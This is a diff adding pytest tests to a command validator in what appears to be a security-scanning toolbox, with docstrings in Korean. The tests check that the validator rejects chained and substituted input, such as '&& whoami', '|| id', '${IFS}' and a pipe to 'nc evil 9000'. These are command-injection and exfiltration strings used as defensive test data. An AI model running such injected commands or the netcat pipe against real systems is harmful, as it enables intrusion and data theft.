@@ -82,6 +82,33 @@ def test_validate_rejects_shell_metachar(monkeypatch):
         assert ei.value.reason in ("shell_metachar", "forbidden_substr")
 
 
+def test_validate_allows_ampersand_in_data_body(monkeypatch):
+    """sqlmap --data 의 폼 바디 구분자 '&' 와 값의 '$' 는 셸 메타로 오거부되면 안 된다(argv 실행)."""
+    _patch_allowlist(monkeypatch)
+    argv = toolbox.validate_command(
+        'sqlmap -u "http://test.internal/api/v1/auth/signup" '
+        '--data="email=1&password=1&name=1" --batch --level=2 --risk=2',
+        "http://test.internal")
+    assert argv[0] == "sqlmap"
+    assert "--data=email=1&password=1&name=1" in argv
+    # 단독 '$' 가 값에 있어도 통과(치환 '$(' '${' 만 거부)
+    argv2 = toolbox.validate_command(
+        'sqlmap -u "http://test.internal/x?id=1" --data="pw=a$b" --batch', "http://test.internal")
+    assert argv2[0] == "sqlmap"
+
+
+def test_validate_still_rejects_chaining_and_substitution(monkeypatch):
+    """단독 '&'/'$' 허용 뒤에도 연쇄('&&' '||')·치환('$(' '${')·파이프는 계속 거부."""
+    _patch_allowlist(monkeypatch)
+    for cmd in ('sqlmap -u "http://test.internal/x" --data="a=1" && whoami',
+                'sqlmap -u "http://test.internal/x" --data="a=1" || id',
+                'sqlmap -u "http://test.internal/x" --data="a=${IFS}"',
+                'nmap test.internal | nc evil 9000'):
+        with pytest.raises(CommandRejected) as ei:
+            toolbox.validate_command(cmd, "http://test.internal")
+        assert ei.value.reason == "shell_metachar"
+
+
 def test_validate_rejects_exploit_flags(monkeypatch):
     _patch_allowlist(monkeypatch)
     with pytest.raises(CommandRejected) as ei:
